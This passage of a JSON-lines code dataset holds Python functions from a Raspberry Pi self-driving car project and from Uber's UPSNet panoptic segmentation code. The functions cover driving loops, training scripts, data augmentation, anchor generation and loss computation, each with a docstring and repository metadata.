self.robot.move_down()\n            time.sleep(0.05)\n        elif command == 'left':\n            self.robot.move_left()\n        elif command == 'right':\n            self.robot.move_right()\n        if last_command is not None:\n            if last_command != command:\n                self.robot.idle()\n                last_command = command\n    count += 1", "path": "self_driving\\DiffController.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nIn the toy dataset we have only 7 pictures classified\nas \"right\". This test checks if the flip function is working\nadding new 7 images with label \"left\" (2) to the dataset.\n\"\"\"\n", "func_signal": "def test_flip_data(self):\n", "code": "aug_data, aug_labels = extend_dataset_flip_axis(self.data, self.labels)\ndata_expected_shape = (25 + 7,\n                       self.width * self.height * self.channels)\nself.assertEqual(aug_data.shape, data_expected_shape)\nself.assertEqual(aug_labels.shape, (25 + 7, 1))\nself.assertEqual(np.uint8, aug_labels.dtype)\nself.assertEqual(np.uint8, aug_data.dtype)\none_right_image = 0\none_left_image = 25\noriginal_image = get_image(self.data[one_right_image])\noriginal_image = np.flip(original_image, axis=1)\nfliped_image = get_image(aug_data[one_left_image])\ncondition = np.all(np.equal(original_image, fliped_image))\nmsg = \"images: {} (orignal) and {} (augmentaded) are not equal\".format(one_right_image, one_left_image)  # noqa\nself.assertTrue(condition, msg=msg)\nonly_left = aug_labels[25: 25 + 7]\nonly_left = only_left.flatten()\nself.assertEqual(np.min(only_left), np.max(only_left))", "path": "self_driving\\data_manipulation\\test\\TestDataAug.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nDrive the robot car using one trained model\n\"\"\"\n", "func_signal": "def main():\n", "code": "parser = argparse.ArgumentParser(description=\"Drive the robot car using one trained model\")  # noqa\n\nparser.add_argument(\"-m\",\n                    \"--mode\",\n                    type=str,\n                    default=\"pure\",\n                    help=\"image mode (default='pure')\")\nparser.add_argument(\"-b\",\n                    \"--bluetooth\",\n                    type=bool,\n                    default=False,\n                    help=\"bluetooth control (default=False)\")\nparser.add_argument(\"-d\",\n                    \"--debug\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"debug (default=False)\")\nparser.add_argument(\"-he\",\n                    \"--height\",\n                    type=int,\n                    default=90,\n                    help=\"image height (default=90)\")\nparser.add_argument(\"-w\",\n                    \"--width\",\n                    type=int,\n                    default=160,\n                    help=\"image width (default=160)\")\nparser.add_argument('-a',\n                    '--architecture',\n                    type=int,\n                    nargs='+',\n                    help='sizes for hidden layers and output layer, should end with \"4\" !, (default=[4])',  # noqa\n                    default=[4])\nparser.add_argument('-conva',\n                    '--conv_architecture',\n                    type=int,\n                    nargs='+',\n                    help='filters for conv layers (default=[32, 64])',\n                    default=[32, 64])\nparser.add_argument('-k',\n                    '--kernel_sizes',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for conv layers (default=None - 5 for every layer)',  # noqa\n                    default=None)\nparser.add_argument('-p',\n                    '--pool_kernel',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for pooling layers (default=None - 2 for every layer)',  # noqa\n                    default=None)\nparser.add_argument('-ac',\n                    '--activations',\n                    type=str,\n                    nargs='+',\n                    help='activations: relu, sigmoid, tanh (defaul=None)',\n                    default=None)\nparser.add_argument(\"-conv\",\n                    \"--conv\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"Use convolutional network (default=False)\")\nparser.add_argument('-r',\n                    '--resize',\n                    type=int,\n                    default=100,\n                    help='resize percentage, (default=100)')\n\nargs = parser.parse_args()\nactivations_dict = {\"relu\": tf.nn.relu,\n                    \"sigmoid\": tf.nn.sigmoid,\n                    \"tanh\": tf.nn.tanh}\n\nif args.activations is not None:\n    activations = [activations_dict[act] for act in args.activations]\nelse:\n    activations = args.activations\n\ncar = DiffController(height=args.height,\n                     width=args.width,\n                     architecture=args.architecture,\n                     activations=activations,\n                     conv_architecture=args.conv_architecture,\n                     kernel_sizes=args.kernel_sizes,\n                     pool_kernel=args.pool_kernel,\n                     resize=args.resize,\n                     conv=args.conv,\n                     mode=args.mode,\n                     bluetooth=args.bluetooth,\n                     debug=args.debug)\nif args.debug:\n    car.drive_debug()\nelse:\n    car.drive()\nif car.robot.btCon:\n    car.robot.disconnect(car.robot.sock)\ntime.sleep(0.3)  # waits for keyboard thread to shutdown", "path": "self_driving\\DiffController.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nThe car drives itself until the key \"q\" is pressed.\n\"\"\"\n", "func_signal": "def drive(self):\n", "code": "last_command = None\nwhile True:\n    img = self.cam.take_picture()\n\n    if key.is_pressed('q'):\n        print('Exiting...')\n        self.robot.idle()\n        break\n    else:\n        img = self.image2float(img)\n        command = self.get_command(img)\n        print(command)\n        if command == 'up':\n            self.robot.move_up()\n            time.sleep(0.05)\n        elif command == 'down':\n            self.robot.move_down()\n            time.sleep(0.05)\n        elif command == 'left':\n            self.robot.move_left()\n        elif command == 'right':\n            self.robot.move_right()\n        if last_command is not None:\n            if last_command != command:\n                self.robot.idle()\n                last_command = command", "path": "self_driving\\DiffController.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nInsert a vertical random shadow in an input_image\n\n:param input_image: image\n:type input_image: numpy.ndarray\n:return: image with shadow\n:rtype: numpy.ndarray\n\"\"\"\n", "func_signal": "def random_shadow(input_image):\n", "code": "height, width = input_image.shape[0], input_image.shape[1]\n[x1, x2] = np.random.choice(width, size=2, replace=False)\nk = height / float(x2 - x1)\nb = - k * x1\nim_array = input_image.copy()\nfor i in range(height):\n    c = int((i - b) / k)\n    im_array[i, :c, :] = (im_array[i, :c, :] * .5).astype(np.uint8)\nreturn im_array", "path": "self_driving\\vision\\image_manipulation.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nFunction to randomize two lists the same way.\nUsualy this functions is used when list1 = dataset,\nand list2 = labels.\n\n:param list1: list\n:type list1: list or np.array\n:param list2: list\n:type list2: list or np.array\n:param init: seed\n:type init: int\n\"\"\"\n", "func_signal": "def randomize_in_place(list1, list2, init):\n", "code": "np.random.seed(seed=init)\nnp.random.shuffle(list1)\nnp.random.seed(seed=init)\nnp.random.shuffle(list2)", "path": "self_driving\\data_manipulation\\data_mani.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nThis function plots the confusion matrix and\nalso prints useful statistics.\n\n:param truth: true labels\n:type truth: np array\n:param predictions: model predictions\n:type predictions: np array\n:param path: path to save image\n:type path: str\n:param label_dict: dict to transform int to str\n:type label_dict: dict\n:param classes: number of classes\n:type classes: int\n\"\"\"\n", "func_signal": "def plotconfusion(truth, predictions, path, label_dict, classes):\n", "code": "acc = np.array(truth) == np.array(predictions)\nsize = float(acc.shape[0])\nacc = np.sum(acc.astype(\"int32\")) / size\ntruth = [label_dict[i] for i in truth]\npredictions = [label_dict[i] for i in predictions]\ncm = ConfusionMatrix(truth, predictions)\ncm_array = cm.to_array()\ncm_diag = np.diag(cm_array)\nsizes_per_cat = []\nfor n in range(cm_array.shape[0]):\n    sizes_per_cat.append(np.sum(cm_array[n]))\nsizes_per_cat = np.array(sizes_per_cat)\nsizes_per_cat = sizes_per_cat.astype(np.float32) ** -1\nrecall = np.multiply(cm_diag, sizes_per_cat)\nprint(\"\\nRecall:{}\".format(recall))\nprint(\"\\nRecall stats: mean = {0:.6f}, std = {1:.6f}\\n\".format(np.mean(recall),  # noqa\n                                                                np.std(recall)))  # noqa\ntitle = \"Confusion matrix of {0} examples\\n accuracy = {1:.6f}\".format(int(size),  # noqa\n                                                                       acc)\nplot_confusion_matrix(cm_array, classes, title=title, path=path)\ncm.print_stats()", "path": "self_driving\\plot\\util.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nMain script to train one model using one kind of data.\n\"\"\"\n", "func_signal": "def main():\n", "code": "parser = argparse.ArgumentParser(description='Train a model')\nparser.add_argument(\"-n\",\n                    \"--name_tfrecords\",\n                    type=str,\n                    default=\"data\",\n                    help=\"name for tfrecords (default=data)\")  # noqa\nparser.add_argument(\"-c\",\n                    \"--channels\",\n                    type=int,\n                    default=3,\n                    help=\"number of channels (default=3)\")\nparser.add_argument(\"-he\",\n                    \"--height\",\n                    type=int,\n                    default=90,\n                    help=\"image height (default=90)\")\nparser.add_argument(\"-w\",\n                    \"--width\",\n                    type=int,\n                    default=160,\n                    help=\"image width (default=160)\")\nparser.add_argument('-a',\n                    '--architecture',\n                    type=int,\n                    nargs='+',\n                    help='sizes for hidden layers and output layer, should end with at least \"3\" !, (default=[3])',  # noqa\n                    default=[3])\nparser.add_argument('-ac',\n                    '--activations',\n                    type=str,\n                    nargs='+',\n                    help='activations: relu, sigmoid, tanh (defaul=None)',\n                    default=None)\nparser.add_argument('-conva',\n                    '--conv_architecture',\n                    type=int,\n                    nargs='+',\n                    help='filters for conv layers (default=[32, 64])',  # noqa\n                    default=[32, 64])\nparser.add_argument('-k',\n                    '--kernel_sizes',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for conv layers (default=None - 5 for every layer)',  # noqa\n                    default=None)\nparser.add_argument('-p',\n                    '--pool_kernel',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for pooling layers (default=None - 2 for every layer)',  # noqa\n                    default=None)\nparser.add_argument(\"-b\",\n                    \"--batch_size\",\n                    type=int,\n                    default=32,\n                    help=\"batch size (default=32)\")\nparser.add_argument(\"-e\",\n                    \"--epochs\",\n                    type=int,\n                    default=5,\n                    help=\"epochs for training (default=5)\")\nparser.add_argument(\"-ns\",\n                    \"--num_steps\",\n                    type=int,\n                    default=1000,\n                    help=\"number of steps for each epoch (default=1000)\")\nparser.add_argument(\"-ss\",\n                    \"--save_step\",\n                    type=int,\n                    default=100,\n                    help=\"number of steps to save variables (default=100)\")\nparser.add_argument(\"-lr\",\n                    \"--learning_rate\",\n                    type=float,\n                    default=0.02,\n                    help=\"learning rate (default=0.02)\")\nopt_list = \"\"\"optimizers: GradientDescent,\n                          Adadelta,\n                          Adagrad,\n                          Adam,\n                          Ftrl,\n                          ProximalGradientDescent,\n                          ProximalAdagrad,\n                          RMSProp\"\"\"\nparser.add_argument(\"-o\",\n                    \"--optimizer\",\n                    type=str,\n                    default=\"GradientDescent\",\n                    help=opt_list + \"(default=GradientDescent)\")\nparser.add_argument(\"-v\",\n                    \"--verbose\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"print training results and calculate confusion matrix (default=False)\")  # noqa\nparser.add_argument(\"-cm\",\n                    \"--cm_name\",\n                    type=str,\n                    default=\"Confusion_Matrix\",\n                    help=\"name to save confusion matrix plot (default=Confusion_Matrix)\")  # noqa\nparser.add_argument(\"-mv\",\n                    \"--move\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"move checkpoits to parent folder (default=False)\")  # noqa\nparser.add_argument(\"-conv\",\n                    \"--conv\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"Use convolutional network (default=False)\")  # noqa\nargs = parser.parse_args()\nrecords = [\"_train.tfrecords\", \"_valid.tfrecords\", \"_test.tfrecords\"]\nnew_records = []\nfor record in records:\n    record = args.name_tfrecords + record\n    new_records.append(record)\n\noptimizer_dict = {\"GradientDescent\": tf.train.GradientDescentOptimizer,  # noqa\n                  \"Adadelta\": tf.train.AdadeltaOptimizer,\n                  \"Adagrad\": tf.train.AdagradOptimizer,\n                  \"Adam\": tf.train.AdamOptimizer,\n                  \"Ftrl\": tf.train.FtrlOptimizer,\n                  \"ProximalGradientDescent\": tf.train.ProximalGradientDescentOptimizer,  # noqa\n                  \"ProximalAdagrad\": tf.train.ProximalAdagradOptimizer,  # noqa\n                  \"RMSProp\": tf.train.RMSPropOptimizer}  # noqa\n\nactivations_dict = {\"relu\": tf.nn.relu,\n                    \"sigmoid\": tf.nn.sigmoid,\n                    \"tanh\": tf.nn.tanh}\nif args.activations is not None:\n    activations = [activations_dict[act] for act in args.activations]\nelse:\n    activations = args.activations\noptimizer = optimizer_dict[args.optimizer]\n\ntrain(name_tfrecords=args.name_tfrecords,\n      records=new_records,\n      height=args.height,\n      width=args.width,\n      channels=args.channels,\n      architecture=args.architecture,\n      activations=activations,\n      conv_architecture=args.conv_architecture,\n      kernel_sizes=args.kernel_sizes,\n      pool_kernel=args.pool_kernel,\n      batch_size=args.batch_size,\n      epochs=args.epochs,\n      num_steps=args.num_steps,\n      save_step=args.save_step,\n      learning_rate=args.learning_rate,\n      optimizer=optimizer,\n      verbose=args.verbose,\n      name=args.cm_name,\n      move=args.move,\n      conv=args.conv)", "path": "self_driving\\ml_training\\train.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nGet command from model's prediction\n\n:param img: image\n:type img: np.array\n:param label_dict: dict translating label to command\n:type label_dict: dict\n:return: command\n:rtype: int\n\"\"\"\n", "func_signal": "def get_command(self, img, label_dict=int2command):\n", "code": "command_int = int(self.trainer.predict(img)[0])\ncommand_int = label_dict[command_int]\nreturn command_int", "path": "self_driving\\DiffController.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nGiven the data and the labels this function shuffles them together\nand separetes four fifths of the data (that is why we use the\nvariable ff) to be the traing data; the rest of the data\nis divide into valid data and test data. If the size of the\ndata is odd we add one observation copy to the dataset.\n\n:param data: dataset\n:type data: np.array\n:param labels: labels\n:type labels: np.array\n:param init: seed\n:type init: int\n:return: train, test and valid dataset and labels\n:rtype: np.array, np.array, np.array, np.array, np.array, np.array\n\"\"\"\n", "func_signal": "def data_cut(data, labels, init=0):\n", "code": "randomize_in_place(data, labels, init)\ndata_size = data.shape[0]\nff = int((4 / 5.0) * data_size)\nrest = data_size - ff\nif rest % 2 == 1:\n    new_data = data[-1]\n    new_label = labels[-1]\n    data = np.vstack([data, new_data])\n    labels = np.vstack([labels, new_label])\n    rest += 1\nrest = int(rest / 2.0)\ntrain_data, train_labels = data[0:ff], labels[0:ff]\nvalid_data, valid_labels = data[ff: ff + rest], labels[ff:ff + rest]\nff = ff + rest\ntest_data, test_labels = data[ff: ff + rest], labels[ff: ff + rest]\nreturn train_data, train_labels, valid_data, valid_labels, test_data, test_labels  # noqa", "path": "self_driving\\data_manipulation\\data_mani.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nMain script to check model's accuracy using one kind of data.\n\"\"\"\n", "func_signal": "def main():\n", "code": "parser = argparse.ArgumentParser(description=\"Checks model's accuracy\")\nparser.add_argument(\"-n\",\n                    \"--name_tfrecords\",\n                    type=str,\n                    default=\"data\",\n                    help=\"name for tfrecords (default=data)\")  # noqa\nparser.add_argument(\"-c\",\n                    \"--channels\",\n                    type=int,\n                    default=3,\n                    help=\"number of channels (default=3)\")\nparser.add_argument(\"-he\",\n                    \"--height\",\n                    type=int,\n                    default=90,\n                    help=\"image height (default=90)\")\nparser.add_argument(\"-w\",\n                    \"--width\",\n                    type=int,\n                    default=160,\n                    help=\"image width (default=160)\")\nparser.add_argument('-a',\n                    '--architecture',\n                    type=int,\n                    nargs='+',\n                    help='sizes for hidden layers and output layer, should end with least \"3\" !, (default=[3])',  # noqa\n                    default=[3])\nparser.add_argument('-ac',\n                    '--activations',\n                    type=str,\n                    nargs='+',\n                    help='activations: relu, sigmoid, tanh (defaul=None)',\n                    default=None)\nparser.add_argument('-conva',\n                    '--conv_architecture',\n                    type=int,\n                    nargs='+',\n                    help='filters for conv layers (default=[32, 64])',\n                    default=[32, 64])\nparser.add_argument('-k',\n                    '--kernel_sizes',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for conv layers (default=None - 5 for every layer)',  # noqa\n                    default=None)\nparser.add_argument('-p',\n                    '--pool_kernel',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for pooling layers (default=None - 2 for every layer)',  # noqa\n                    default=None)\nparser.add_argument(\"-t\",\n                    \"--test\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"print test results and calculate confusion matrix (default=False)\")  # noqa\nparser.add_argument(\"-cm\",\n                    \"--cm_name\",\n                    type=str,\n                    default=\"Confusion_Matrix\",\n                    help=\"name to save confusion matrix plot (default=Confusion_Matrix)\")  # noqa\nparser.add_argument(\"-conv\",\n                    \"--conv\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"Use convolutional network (default=False)\")\nargs = parser.parse_args()\nrecords = [\"_train.tfrecords\", \"_valid.tfrecords\", \"_test.tfrecords\"]\nnew_records = []\nfor record in records:\n    record = args.name_tfrecords + record\n    new_records.append(record)\n\nactivations_dict = {\"relu\": tf.nn.relu,\n                    \"sigmoid\": tf.nn.sigmoid,\n                    \"tanh\": tf.nn.tanh}\nif args.activations is not None:\n    activations = [activations_dict[act] for act in args.activations]\nelse:\n    activations = args.activations\n\nacc(name_tfrecords=args.name_tfrecords,\n    records=new_records,\n    height=args.height,\n    width=args.width,\n    channels=args.channels,\n    architecture=args.architecture,\n    activations=activations,\n    conv_architecture=args.conv_architecture,\n    kernel_sizes=args.kernel_sizes,\n    pool_kernel=args.pool_kernel,\n    test=args.test,\n    name=args.cm_name,\n    conv=args.conv)", "path": "self_driving\\ml_training\\acc_test.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "'''\nConnect to nxt brick using the id 'blue_id'. The default\nid is the global variable NXT_ID. It returs one\nobject for bluethoot connection 'sock' and one\nobject for NXT control 'brick'.\n\n:param blue_id: Bluethoot MAC address\n:type blue_id: str\n:rtype: (nxt.bluesock.BlueSock, nxt.brick)\n'''\n", "func_signal": "def connectCar(blue_id=NXT_ID):\n", "code": "try:\n    sock = bluesock.BlueSock(blue_id)\n    brick = sock.connect()\n    return sock, brick\nexcept:\n    print(\"NO connection with {}\".format(NXT_ID))", "path": "self_driving\\nxt_car\\nxt_bluetooth.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\nMain script to perform optmizer search.\n\"\"\"\n", "func_signal": "def main():\n", "code": "parser = argparse.ArgumentParser(description='Perform optmizer search')\nparser.add_argument(\"-n\",\n                    \"--name_tfrecords\",\n                    type=str,\n                    default=\"data\",\n                    help=\"name for tfrecords (default=data)\")  # noqa\nparser.add_argument('-a',\n                    '--architecture',\n                    type=int,\n                    nargs='+',\n                    help='sizes for hidden layers and output layer, should end with at least \"3\" !, (default=[3])',  # noqa\n                    default=[3])\nparser.add_argument('-ac',\n                    '--activations',\n                    type=str,\n                    nargs='+',\n                    help='activations: relu, sigmoid, tanh (defaul=None)',\n                    default=None)\nparser.add_argument(\"-he\",\n                    \"--height\",\n                    type=int,\n                    default=90,\n                    help=\"image height (default=90)\")\nparser.add_argument(\"-w\",\n                    \"--width\",\n                    type=int,\n                    default=160,\n                    help=\"image width (default=160)\")\nparser.add_argument(\"-c\",\n                    \"--channels\",\n                    type=int,\n                    default=3,\n                    help=\"number of channels (default=3)\")\nparser.add_argument(\"-lr\",\n                    \"--learning_rate\",\n                    type=float,\n                    default=0.02,\n                    help=\"learning rate (default=0.02)\")\nparser.add_argument('-conva',\n                    '--conv_architecture',\n                    type=int,\n                    nargs='+',\n                    help='filters for conv layers (default=[32, 64])',  # noqa\n                    default=[32, 64])\nparser.add_argument('-k',\n                    '--kernel_sizes',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for conv layers (default=None - 5 for every layer)',  # noqa\n                    default=None)\nparser.add_argument('-p',\n                    '--pool_kernel',\n                    type=int,\n                    nargs='+',\n                    help='kernel sizes for pooling layers (default=None - 2 for every layer)',  # noqa\n                    default=None)\nparser.add_argument(\"-b\",\n                    \"--batch_size\",\n                    type=int,\n                    default=32,\n                    help=\"batch size (default=32)\")\nparser.add_argument(\"-e\",\n                    \"--epochs\",\n                    type=int,\n                    default=5,\n                    help=\"epochs for training (default=5)\")\nparser.add_argument(\"-ns\",\n                    \"--num_steps\",\n                    type=int,\n                    default=1000,\n                    help=\"number of steps for each epoch (default=1000)\")\nparser.add_argument(\"-ss\",\n                    \"--save_step\",\n                    type=int,\n                    default=100,\n                    help=\"number of steps to save variables (default=100)\")\nparser.add_argument(\"-conv\",\n                    \"--conv\",\n                    action=\"store_true\",\n                    default=False,\n                    help=\"Use convolutional network (default=False)\")\nargs = parser.parse_args()\nrecords = [\"_train.tfrecords\", \"_valid.tfrecords\", \"_test.tfrecords\"]\nnew_records = []\nfor record in records:\n    record = args.name_tfrecords + record\n    new_records.append(record)\n\nactivations_dict = {\"relu\": tf.nn.relu,\n                    \"sigmoid\": tf.nn.sigmoid,\n                    \"tanh\": tf.nn.tanh}\nif args.activations is not None:\n    activations = [activations_dict[act] for act in args.activations]\nelse:\n    activations = args.activations\noptmizers_search(name_tfrecords=args.name_tfrecords,\n                 records=new_records,\n                 height=args.height,\n                 width=args.width,\n                 channels=args.channels,\n                 architecture=args.architecture,\n                 activations=activations,\n                 conv_architecture=args.conv_architecture,\n                 kernel_sizes=args.kernel_sizes,\n                 pool_kernel=args.pool_kernel,\n                 batch_size=args.batch_size,\n                 epochs=args.epochs,\n                 learning_rate=args.learning_rate,\n                 num_steps=args.num_steps,\n                 save_step=args.save_step,\n                 conv=args.conv)", "path": "self_driving\\ml_training\\best_optimizer.py", "repo_name": "felipessalvatore/self_driving_pi_car", "stars": 761, "license": "mit", "language": "python", "size": 19421}
{"docstring": "\"\"\"\n    Args:\n        predict:(n, c, h, w)\n        target:(n, h, w)\n        weight (Tensor, optional): a manual rescaling weight given to each class.\n                                   If given, has to be a Tensor of size \"nclasses\"\n\"\"\"\n", "func_signal": "def forward(self, predict, target, weight=None):\n", "code": "assert not target.requires_grad\nassert predict.dim() == 4\nassert target.dim() == 3\nassert predict.size(0) == target.size(0), \"{0} vs {1} \".format(predict.size(0), target.size(0))\nassert predict.size(2) == target.size(1), \"{0} vs {1} \".format(predict.size(2), target.size(1))\nassert predict.size(3) == target.size(2), \"{0} vs {1} \".format(predict.size(3), target.size(2))\nn, c, h, w = predict.size()\n\nloss = F.cross_entropy(predict, target, weight=weight, size_average=self.size_average, ignore_index=self.ignore_label)\nreturn loss", "path": "upsnet\\models\\fcn.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"Add blobs needed training RPN-only and end-to-end Faster R-CNN models.\"\"\"\n", "func_signal": "def add_rpn_blobs(blobs, im_scales, roidb):\n", "code": "if config.network.has_fpn:\n    # RPN applied to many feature levels, as in the FPN paper\n    foas = []\n    for field_stride in config.network.rpn_feat_stride:\n        anchor_sizes = (config.network.anchor_scales[0] * field_stride,)\n        anchor_aspect_ratios = config.network.anchor_ratios\n        foa = get_field_of_anchors(\n            field_stride, anchor_sizes, anchor_aspect_ratios\n        )\n        foas.append(foa)\n    all_anchors = np.concatenate([f.field_of_anchors for f in foas])\nelse:\n    foa = get_field_of_anchors(\n        config.network.rpn_feat_stride, np.array(config.network.anchor_scales) * config.network.rpn_feat_stride, config.network.anchor_ratios\n    )\n    all_anchors = foa.field_of_anchors\n\nfor im_i, entry in enumerate(roidb):\n    scale = im_scales[im_i]\n    im_height = np.round(entry['height'] * scale)\n    im_width = np.round(entry['width'] * scale)\n    gt_inds = np.where(\n        (entry['gt_classes'] > 0) & (entry['is_crowd'] == 0)\n    )[0]\n    crowd_gt_inds = np.where(\n        (entry['gt_classes'] > 0) & (entry['is_crowd'] == 1)\n    )[0]\n    gt_rois = entry['boxes'][gt_inds, :] * scale\n    crowd_gt_rois = entry['boxes'][crowd_gt_inds, :] * scale\n    # TODO(rbg): gt_boxes is poorly named;\n    # should be something like 'gt_rois_info'\n    gt_boxes = np.zeros((len(gt_inds), 6), dtype=np.float32)\n    gt_boxes[:, 0] = im_i  # batch inds\n    gt_boxes[:, 1:5] = gt_rois\n    gt_boxes[:, 5] = entry['gt_classes'][gt_inds]\n    im_info = np.array([[im_height, im_width, scale]], dtype=np.float32)\n    blobs['im_info'].append(im_info)\n\n    # Add RPN targets\n    if config.network.has_fpn:\n        # RPN applied to many feature levels, as in the FPN paper\n        rpn_blobs = _get_rpn_blobs(\n            im_height, im_width, foas, all_anchors, gt_rois)\n        for i, lvl in enumerate(config.network.rpn_feat_stride):\n            for k, v in rpn_blobs[i].items():\n                blobs[k + '_fpn' + str(lvl)].append(v)\n    else:\n        # Classical RPN, applied to a single feature level\n        rpn_blobs = _get_rpn_blobs(\n            im_height, im_width, [foa], all_anchors, gt_rois)\n        for k, v in rpn_blobs.items():\n            blobs[k].append(v)\n\nfor k, v in blobs.items():\n    if isinstance(v, list) and len(v) > 0:\n        blobs[k] = np.concatenate(v)\n\n# valid_keys = [\n#     'has_visible_keypoints', 'boxes', 'segms', 'seg_areas', 'gt_classes',\n#     'gt_overlaps', 'is_crowd', 'box_to_gt_ind_map', 'gt_keypoints'\n# ]\nvalid_keys = [\n    'boxes', 'segms', 'seg_areas', 'gt_classes',\n    'gt_overlaps', 'is_crowd', 'box_to_gt_ind_map'\n]\nminimal_roidb = [{} for _ in range(len(roidb))]\nfor i, e in enumerate(roidb):\n    for k in valid_keys:\n        if k in e:\n            minimal_roidb[i][k] = e[k]\nblobs['roidb'] = minimal_roidb\n\n# Always return valid=True, since RPN minibatches are valid by design\nreturn True", "path": "upsnet\\rpn\\assign_anchor.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\nEnumerate a set of anchors for each aspect ratio wrt an anchor.\n\"\"\"\n\n", "func_signal": "def _ratio_enum(anchor, ratios):\n", "code": "w, h, x_ctr, y_ctr = _whctrs(anchor)\nsize = w * h\nsize_ratios = size / ratios\nws = np.round(np.sqrt(size_ratios))\nhs = np.round(ws * ratios)\nanchors = _mkanchors(ws, hs, x_ctr, y_ctr)\nreturn anchors", "path": "upsnet\\rpn\\generate_anchors.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\" unmap a subset inds of data into original data of size count \"\"\"\n", "func_signal": "def _unmap(data, count, inds, fill=0):\n", "code": "if len(data.shape) == 1:\n    ret = np.empty((count,), dtype=np.float32)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count,) + data.shape[1:], dtype=np.float32)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "upsnet\\rpn\\assign_anchor.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"Unmap a subset of item (data) back to the original set of items (of\nsize count)\"\"\"\n", "func_signal": "def unmap(data, count, inds, fill=0):\n", "code": "if count == len(inds):\n    return data\n\nif len(data.shape) == 1:\n    ret = np.empty((count, ), dtype=data.dtype)\n    ret.fill(fill)\n    ret[inds] = data\nelse:\n    ret = np.empty((count, ) + data.shape[1:], dtype=data.dtype)\n    ret.fill(fill)\n    ret[inds, :] = data\nreturn ret", "path": "upsnet\\rpn\\generate_anchors.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "# A roidb is a list of dictionaries, each with the following keys:\n#   boxes\n#   gt_overlaps\n#   gt_classes\n#   flipped\n", "func_signal": "def roidb(self):\n", "code": "if self._roidb is not None:\n    return self._roidb\nself._roidb = self.roidb_handler()\nreturn self._roidb", "path": "upsnet\\dataset\\imdb.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\n:param gt_segs: [1 x h x w]\n:param gt_masks: [num_gt_boxes x h x w]\n:param keep_inds: [num_kept_boxes x 1]\n:return: matched_gt: [1 x h x w]\n\"\"\"\n\n", "func_signal": "def forward(self, gt_segs, gt_masks, keep_inds=None):\n", "code": "matched_gt = torch.ones_like(gt_segs) * -1\nmatched_gt = torch.where(gt_segs <= config.dataset.num_seg_classes - config.dataset.num_classes, gt_segs, matched_gt)\nmatched_gt = torch.where(gt_segs >= 255, gt_segs, matched_gt)\nif keep_inds is not None:\n    gt_masks = gt_masks[keep_inds]\n\nfor i in range(gt_masks.shape[0]):\n    matched_gt[(gt_masks[[i], :, :] != 0) & (gt_masks[[i], :, :] != 255)] = i + self.num_seg_classes - self.num_inst_classes\nif keep_inds is not None:\n    matched_gt[matched_gt == -1] = self.num_seg_classes - self.num_inst_classes + gt_masks.shape[0]\nelse:\n    matched_gt[matched_gt == -1] = 255\n\nreturn matched_gt", "path": "upsnet\\operators\\modules\\mask_matching.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
{"docstring": "\"\"\"\nClip boxes of the pad area.\n:param tensor: [n, c, H, W]\n:param pad_shape: [h, w]\n:return: [n, c, h, w]\n\"\"\"\n", "func_signal": "def _clip_pad(tensor, pad_shape):\n", "code": "H, W = tensor.shape[2:]\nh, w = pad_shape\n\nif h < H or w < W:\n    tensor = tensor[:, :, :h, :w].copy()\n\nreturn tensor", "path": "upsnet\\operators\\functions\\pyramid_proposal.py", "repo_name": "uber-research/UPSNet", "stars": 625, "license": "other", "language": "python", "size": 168}
